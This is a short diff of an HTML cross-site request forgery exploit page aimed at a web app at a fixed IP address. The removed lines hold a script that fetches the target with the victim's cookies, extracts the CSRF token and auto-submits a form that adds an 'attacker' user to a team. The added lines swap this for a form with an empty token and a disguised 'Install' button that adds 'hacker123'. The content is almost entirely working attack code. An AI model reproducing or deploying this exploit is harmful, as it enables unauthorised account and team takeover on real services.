@@ -1,21 +1,9 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <form id="exploitForm" action="http://52.47.161.102:3000/api/teams/1/addUser/attacker" method="POST">
-    <input type="hidden" name="csrfToken" id="csrfTokenInput">
+  <form action="http://52.47.161.102:3000/api/teams/1/addUser/hacker123" method="POST">
+    <input type="hidden" name="csrfToken" value="">
     <input type="submit" id="installbutton" value="Install">
   </form>
-  <script>
-    fetch('http://52.47.161.102:3000/', { credentials: 'include' })
-      .then(response => response.text())
-      .then(data => {
-        const parser = new DOMParser();
-        const doc = parser.parseFromString(data, 'text/html');
-        const csrfToken = doc.querySelector('input[name="csrfToken"]').value;
-        document.getElementById('csrfTokenInput').value = csrfToken;
-        document.getElementById('exploitForm').submit();
-      })
-      .catch(err => console.error('Error:', err));
-  </script>
 </body>
 </html>
